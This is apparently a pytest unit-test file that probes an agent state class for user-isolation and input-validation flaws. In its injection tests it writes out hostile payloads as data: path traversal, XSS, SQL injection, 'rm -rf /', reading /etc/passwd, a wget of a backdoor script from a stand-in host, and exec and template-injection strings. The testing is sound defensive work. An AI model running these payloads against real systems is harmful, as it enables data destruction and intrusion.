"""Unit tests demonstrating specific DeepAgentState security violations.

CRITICAL SECURITY VULNERABILITY: Issue #271 - DeepAgentState Security Violations

This test suite focuses on specific security violations in the DeepAgentState
implementation that create user isolation risks and data exposure vulnerabilities.

Business Value Justification:
- Segment: ALL (Free → Enterprise)
- Business Goal: Security Compliance & User Data Protection  
- Value Impact: Prevents regulatory violations and customer data breaches
- Revenue Impact: Protects enterprise contracts requiring security compliance

SECURITY VIOLATIONS TESTED:
1. Mutable default argument vulnerabilities
2. Global state pollution patterns
3. Insufficient data sanitization
4. Memory reference sharing risks
5. Weak validation boundaries

EXPECTED OUTCOME: These tests should FAIL initially, proving security violations exist.
"""

import pytest
import time
import uuid
import copy
from typing import Dict, Any, List, Optional
from unittest.mock import MagicMock, patch

from test_framework.ssot.base_test_case import SSotBaseTestCase
from netra_backend.app.agents.state import (
    DeepAgentState, 
    OptimizationsResult,
    ActionPlanResult,
    ReportResult,
    AgentMetadata
)
from netra_backend.app.schemas.agent_models import AgentMetadata as SchemaAgentMetadata


class TestDeepAgentStateSecurityViolations(SSotBaseTestCase):
    """Unit tests for specific security violations in DeepAgentState implementation."""
    
    def setUp(self):
        """Set up test environment with security violation tracking."""
        super().setUp()
        self.security_violations = []
        self.vulnerability_evidence = {}
        
    def test_mutable_default_argument_vulnerability(self):
        """
        SECURITY VIOLATION: Mutable default arguments create shared state risks.
        
        This test proves that DeepAgentState uses mutable default arguments
        that can be shared between instances, creating security vulnerabilities.
        
        EXPECTED: This test should FAIL - proving the vulnerability exists.
        """
        
        # Create multiple instances to test for shared mutable defaults
        state_1 = DeepAgentState(user_id="user_1", user_request="Request 1")
        state_2 = DeepAgentState(user_id="user_2", user_request="Request 2")
        
        # Check if default mutable objects are shared (VULNERABILITY)
        mutable_sharing_detected = False
        sharing_evidence = {}
        
        # Test messages list sharing
        if id(state_1.messages) == id(state_2.messages):
            mutable_sharing_detected = True
            sharing_evidence["messages"] = {
                "state_1_id": id(state_1.messages),
                "state_2_id": id(state_2.messages),
                "shared": True
            }
            
        # Test metadata sharing
        if id(state_1.metadata) == id(state_2.metadata):
            mutable_sharing_detected = True
            sharing_evidence["metadata"] = {
                "state_1_id": id(state_1.metadata),
                "state_2_id": id(state_2.metadata),
                "shared": True
            }
            
        # Test quality_metrics sharing
        if id(state_1.quality_metrics) == id(state_2.quality_metrics):
            mutable_sharing_detected = True
            sharing_evidence["quality_metrics"] = {
                "state_1_id": id(state_1.quality_metrics),
                "state_2_id": id(state_2.quality_metrics), 
                "shared": True
            }
            
        # Test context_tracking sharing
        if id(state_1.context_tracking) == id(state_2.context_tracking):
            mutable_sharing_detected = True
            sharing_evidence["context_tracking"] = {
                "state_1_id": id(state_1.context_tracking),
                "state_2_id": id(state_2.context_tracking),
                "shared": True
            }
        
        # Test practical impact of sharing
        if mutable_sharing_detected:
            # Demonstrate the security risk
            state_1.messages.append({"content": "USER_1_SECRET_MESSAGE", "api_key": "sk-user1-secret"})
            
            # Check if User 1's secret appears in User 2's state
            user_1_secret_in_user_2 = any(
                "USER_1_SECRET_MESSAGE" in str(msg) or "sk-user1-secret" in str(msg)
                for msg in state_2.messages
            )
            
            if user_1_secret_in_user_2:
                self.security_violations.append({
                    "type": "mutable_default_sharing",
                    "severity": "CRITICAL",
                    "evidence": "User 1 secret data visible in User 2 state",
                    "details": sharing_evidence
                })
        
        # VULNERABILITY ASSERTION: This should FAIL if vulnerability exists
        self.assertFalse(
            mutable_sharing_detected,
            f"🚨 CRITICAL SECURITY VIOLATION: Mutable default arguments create shared state! "
            f"Multiple users share the same mutable objects, allowing data leakage. "
            f"Evidence: {sharing_evidence}, Security violations: {self.security_violations}"
        )
    
    def test_metadata_object_reference_security_violation(self):
        """
        SECURITY VIOLATION: AgentMetadata objects may share references.
        
        This test proves that AgentMetadata instances can share object references,
        allowing one user's metadata changes to affect another user.
        
        EXPECTED: This test should FAIL - proving the vulnerability exists.
        """
        
        # Create states with potentially shared metadata
        state_1 = DeepAgentState(user_id="user_1", user_request="Metadata test 1")
        state_2 = DeepAgentState(user_id="user_2", user_request="Metadata test 2") 
        
        # Track original metadata object IDs
        metadata_1_id = id(state_1.metadata)
        metadata_2_id = id(state_2.metadata)
        custom_fields_1_id = id(state_1.metadata.custom_fields)
        custom_fields_2_id = id(state_2.metadata.custom_fields)
        execution_context_1_id = id(state_1.metadata.execution_context)
        execution_context_2_id = id(state_2.metadata.execution_context)
        
        reference_sharing_detected = False
        sharing_details = {}
        
        # Check for shared metadata objects
        if metadata_1_id == metadata_2_id:
            reference_sharing_detected = True
            sharing_details["metadata_root"] = {"shared": True, "id": metadata_1_id}
            
        if custom_fields_1_id == custom_fields_2_id:
            reference_sharing_detected = True
            sharing_details["custom_fields"] = {"shared": True, "id": custom_fields_1_id}
            
        if execution_context_1_id == execution_context_2_id:
            reference_sharing_detected = True
            sharing_details["execution_context"] = {"shared": True, "id": execution_context_1_id}
        
        # Test practical security impact
        if reference_sharing_detected:
            # User 1 adds sensitive metadata
            state_1.metadata.custom_fields["user_1_api_key"] = "sk-user1-private-key-12345"
            state_1.metadata.execution_context["user_1_session"] = "session_user1_secret_token"
            
            # Check if User 1's sensitive data appears in User 2's metadata
            user_2_custom_fields = state_2.metadata.custom_fields
            user_2_execution_context = state_2.metadata.execution_context
            
            security_breach_detected = (
                "sk-user1-private-key-12345" in str(user_2_custom_fields) or
                "session_user1_secret_token" in str(user_2_execution_context) or
                "user_1_api_key" in user_2_custom_fields or
                "user_1_session" in user_2_execution_context
            )
            
            if security_breach_detected:
                self.security_violations.append({
                    "type": "metadata_reference_sharing",
                    "severity": "CRITICAL",
                    "evidence": {
                        "user_1_secret_in_user_2": True,
                        "user_2_custom_fields": user_2_custom_fields,
                        "user_2_execution_context": user_2_execution_context
                    }
                })
        
        # VULNERABILITY ASSERTION: This should FAIL if vulnerability exists  
        self.assertFalse(
            reference_sharing_detected,
            f"🚨 CRITICAL SECURITY VIOLATION: AgentMetadata reference sharing detected! "
            f"User metadata objects are shared, allowing cross-user data contamination. "
            f"Sharing details: {sharing_details}, Security violations: {self.security_violations}"
        )
    
    def test_state_merge_security_boundary_violation(self):
        """
        SECURITY VIOLATION: merge_from() method violates security boundaries.
        
        This test proves that the merge_from() method can merge sensitive data
        from one user's state into another user's state without proper validation.
        
        EXPECTED: This test should FAIL - proving the vulnerability exists.
        """
        
        # Create user states with sensitive data
        user_a_state = DeepAgentState(
            user_id="user_a",
            user_request="User A private financial analysis", 
            chat_thread_id="thread_a",
            run_id="run_a_123"
        )
        
        user_b_state = DeepAgentState(
            user_id="user_b",
            user_request="User B corporate analysis",
            chat_thread_id="thread_b", 
            run_id="run_b_456"
        )
        
        # Add sensitive data to User A
        user_a_state.metadata.custom_fields["user_a_ssn"] = "123-45-6789"
        user_a_state.metadata.custom_fields["user_a_bank"] = "Bank Account: 987654321"
        user_a_state.context_tracking["user_a_session"] = "private_session_a_token"
        user_a_state.quality_metrics["user_a_score"] = {"credit_score": 850}
        
        # Add sensitive data to User B
        user_b_state.metadata.custom_fields["user_b_ein"] = "12-3456789"
        user_b_state.metadata.custom_fields["user_b_revenue"] = "Corporate Revenue: $50M"
        user_b_state.context_tracking["user_b_session"] = "corporate_session_b_token"
        
        # SECURITY VIOLATION: Attempt to merge states (should be prevented)
        try:
            # This should either fail or create a security boundary violation
            merged_state = user_b_state.merge_from(user_a_state)
            
            # Check if User A's sensitive data merged into User B's context
            merged_dict = merged_state.to_dict()
            merged_str = str(merged_dict)
            
            security_violations_found = []
            
            # Check for User A's sensitive data in merged state
            if "123-45-6789" in merged_str:
                security_violations_found.append("User A SSN leaked")
                
            if "Bank Account: 987654321" in merged_str:
                security_violations_found.append("User A bank account leaked")
                
            if "private_session_a_token" in merged_str:
                security_violations_found.append("User A session token leaked")
                
            if "credit_score" in merged_str:
                security_violations_found.append("User A credit score leaked")
            
            # Check if merged state has User B as primary user but User A's data
            if (merged_state.user_id == "user_b" and len(security_violations_found) > 0):
                self.security_violations.append({
                    "type": "merge_security_boundary_violation",
                    "severity": "CRITICAL", 
                    "evidence": {
                        "user_a_data_in_user_b_state": security_violations_found,
                        "merged_state_user_id": merged_state.user_id,
                        "merged_state_preview": str(merged_dict)[:500]
                    }
                })
                
                # VULNERABILITY ASSERTION: This should FAIL if vulnerability exists
                self.fail(
                    f"🚨 CRITICAL SECURITY VIOLATION: merge_from() allows cross-user data leakage! "
                    f"User A's sensitive data merged into User B's state. "
                    f"Violations found: {security_violations_found}"
                )
                
        except Exception as e:
            # If merge fails, that's the expected secure behavior
            self.test_logger.info(f"merge_from() properly rejected cross-user merge: {e}")
    
    def test_copy_with_updates_security_validation_bypass(self):
        """
        SECURITY VIOLATION: copy_with_updates() bypasses security validation.
        
        This test proves that copy_with_updates() can be used to inject
        malicious or invalid data that bypasses normal validation.
        
        EXPECTED: This test should FAIL - proving the vulnerability exists.
        """
        
        # Create base state
        base_state = DeepAgentState(
            user_id="legit_user",
            user_request="Legitimate request",
            chat_thread_id="thread_123",
            run_id="run_456"
        )
        
        security_bypass_detected = False
        bypass_evidence = {}
        
        # Attempt to inject malicious data through copy_with_updates
        malicious_updates = {
            "user_id": "../../../admin",  # Path traversal attempt
            "user_request": "<script>alert('XSS')</script>",  # XSS attempt
            "chat_thread_id": "'; DROP TABLE users; --",  # SQL injection attempt
            "agent_input": {
                "malicious_payload": "../../../../etc/passwd",
                "admin_override": True,
                "backdoor_access": "enabled"
            },
            "step_count": -999999,  # Invalid negative value
            "run_id": "0" * 1000,  # Excessive length
        }
        
        try:
            # This should either fail validation or create a security risk
            malicious_state = base_state.copy_with_updates(**malicious_updates)
            
            # Check if malicious data was accepted without validation
            malicious_dict = malicious_state.to_dict()
            
            # Check for security validation bypass
            validation_bypasses = []
            
            if malicious_state.user_id == "../../../admin":
                validation_bypasses.append("Path traversal in user_id")
                security_bypass_detected = True
                
            if "<script>" in malicious_state.user_request:
                validation_bypasses.append("XSS payload in user_request")
                security_bypass_detected = True
                
            if "DROP TABLE" in malicious_state.chat_thread_id:
                validation_bypasses.append("SQL injection in chat_thread_id")
                security_bypass_detected = True
                
            if malicious_state.step_count < 0:
                validation_bypasses.append("Negative step_count allowed")
                security_bypass_detected = True
                
            if len(malicious_state.run_id) > 100:  # Unreasonably long
                validation_bypasses.append("Excessive run_id length allowed")
                security_bypass_detected = True
                
            if malicious_state.agent_input and "backdoor_access" in malicious_state.agent_input:
                validation_bypasses.append("Backdoor access payload accepted")
                security_bypass_detected = True
            
            if security_bypass_detected:
                bypass_evidence = {
                    "validation_bypasses": validation_bypasses,
                    "malicious_state_preview": str(malicious_dict)[:500],
                    "accepted_malicious_fields": malicious_updates
                }
                
        except Exception as e:
            # If copy_with_updates fails, that might be expected secure behavior
            self.test_logger.info(f"copy_with_updates() properly rejected malicious data: {e}")
        
        # VULNERABILITY ASSERTION: This should FAIL if vulnerability exists
        self.assertFalse(
            security_bypass_detected,
            f"🚨 CRITICAL SECURITY VIOLATION: copy_with_updates() bypasses security validation! "
            f"Malicious data was accepted without proper validation. "
            f"Evidence: {bypass_evidence}"
        )
    
    def test_agent_input_injection_vulnerability(self):
        """
        SECURITY VIOLATION: agent_input field allows arbitrary data injection.
        
        This test proves that the agent_input field can be used to inject
        arbitrary malicious data without proper sanitization or validation.
        
        EXPECTED: This test should FAIL - proving the vulnerability exists.
        """
        
        # Create state with malicious agent_input
        malicious_agent_input = {
            "user_credentials": {
                "username": "admin",
                "password": "admin123", 
                "api_key": "sk-malicious-key-12345"
            },
            "system_commands": [
                "rm -rf /",
                "cat /etc/passwd",
                "wget http://malicious.com/backdoor.sh"
            ],
            "data_extraction": {
                "target_users": ["all"],
                "extract_pii": True,
                "bypass_permissions": True
            },
            "code_injection": {
                "eval_payload": "exec('import os; os.system(\"cat /etc/passwd\")')",
                "template_injection": "{{config.__class__.__init__.__globals__['os'].environ}}"
            }
        }
        
        injection_vulnerability_detected = False
        vulnerability_details = {}
        
        try:
            # Create state with malicious input (should be validated/sanitized)
            vulnerable_state = DeepAgentState(
                user_id="victim_user",
                user_request="Innocent request",
                chat_thread_id="thread_victim",
                run_id="run_victim_123",
                agent_input=malicious_agent_input
            )
            
            # Check if malicious data was stored without sanitization
            state_dict = vulnerable_state.to_dict()
            state_str = str(state_dict)
            
            injection_indicators = []
            
            # Check for dangerous payload preservation
            if "rm -rf /" in state_str:
                injection_indicators.append("Destructive system command preserved")
                injection_vulnerability_detected = True
                
            if "exec(" in state_str:
                injection_indicators.append("Code execution payload preserved")
                injection_vulnerability_detected = True
                
            if "api_key" in state_str and "sk-malicious-key" in state_str:
                injection_indicators.append("Malicious API key preserved")
                injection_vulnerability_detected = True
                
            if "bypass_permissions" in state_str:
                injection_indicators.append("Permission bypass flag preserved")
                injection_vulnerability_detected = True
                
            if "extract_pii" in state_str:
                injection_indicators.append("PII extraction directive preserved")
                injection_vulnerability_detected = True
            
            if injection_vulnerability_detected:
                vulnerability_details = {
                    "injection_indicators": injection_indicators,
                    "malicious_input_preserved": malicious_agent_input,
                    "vulnerable_state_preview": str(state_dict)[:500]
                }
                
        except Exception as e:
            # If creation fails, that might be expected secure behavior
            self.test_logger.info(f"DeepAgentState properly rejected malicious agent_input: {e}")
        
        # VULNERABILITY ASSERTION: This should FAIL if vulnerability exists
        self.assertFalse(
            injection_vulnerability_detected,
            f"🚨 CRITICAL SECURITY VIOLATION: agent_input allows arbitrary data injection! "
            f"Malicious payloads are preserved without sanitization. "
            f"Vulnerability details: {vulnerability_details}"
        )
    
    def test_serialization_security_information_disclosure(self):
        """
        SECURITY VIOLATION: to_dict() method may expose sensitive internal data.
        
        This test proves that the to_dict() serialization can expose sensitive
        internal data that should not be accessible to users.
        
        EXPECTED: This test should FAIL - proving the vulnerability exists.
        """
        
        # Create state with mixed sensitive and non-sensitive data
        state = DeepAgentState(
            user_id="test_user",
            user_request="Standard request",
            chat_thread_id="thread_123",
            run_id="run_456"
        )
        
        # Add sensitive internal data that should not be exposed
        state.metadata.custom_fields.update({
            "internal_api_key": "sk-internal-system-key-secret",
            "database_password": "db_admin_password_123",
            "system_token": "system_access_token_secret",
            "debug_info": {
                "server_ip": "192.168.1.100",
                "internal_port": 5432,
                "admin_credentials": "admin:admin123"
            }
        })
        
        state.context_tracking.update({
            "internal_session": "internal_session_secret_token",
            "system_flags": {"debug_mode": True, "bypass_auth": True},
            "server_config": {
                "secret_key": "flask_secret_key_production",
                "jwt_secret": "jwt_signing_secret_key"
            }
        })
        
        # Serialize state (potentially exposing sensitive data)
        serialized_dict = state.to_dict()
        serialized_str = str(serialized_dict)
        
        information_disclosure_detected = False
        exposed_secrets = []
        
        # Check for exposed sensitive data
        sensitive_patterns = [
            "sk-internal-system-key-secret",
            "db_admin_password_123", 
            "system_access_token_secret",
            "internal_session_secret_token",
            "flask_secret_key_production",
            "jwt_signing_secret_key",
            "admin:admin123"
        ]
        
        for pattern in sensitive_patterns:
            if pattern in serialized_str:
                exposed_secrets.append(pattern)
                information_disclosure_detected = True
        
        # Check for structural exposure of sensitive fields
        sensitive_field_patterns = [
            "internal_api_key",
            "database_password", 
            "system_token",
            "admin_credentials",
            "bypass_auth",
            "secret_key",
            "jwt_secret"
        ]
        
        for field_pattern in sensitive_field_patterns:
            if field_pattern in serialized_str:
                exposed_secrets.append(f"field:{field_pattern}")
                information_disclosure_detected = True
        
        # VULNERABILITY ASSERTION: This should FAIL if vulnerability exists
        self.assertFalse(
            information_disclosure_detected,
            f"🚨 CRITICAL SECURITY VIOLATION: to_dict() exposes sensitive internal data! "
            f"Serialization reveals secrets that should be protected. "
            f"Exposed secrets: {exposed_secrets}, "
            f"Full serialization preview: {serialized_str[:500]}"
        )
    
    def tearDown(self):
        """Clean up and record security violations found."""
        super().tearDown()
        
        if self.security_violations:
            self.test_logger.error(
                f"🚨 SECURITY VIOLATIONS DETECTED: {len(self.security_violations)} "
                f"critical security issues found in DeepAgentState implementation. "
                f"Details: {self.security_violations}"
            )


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])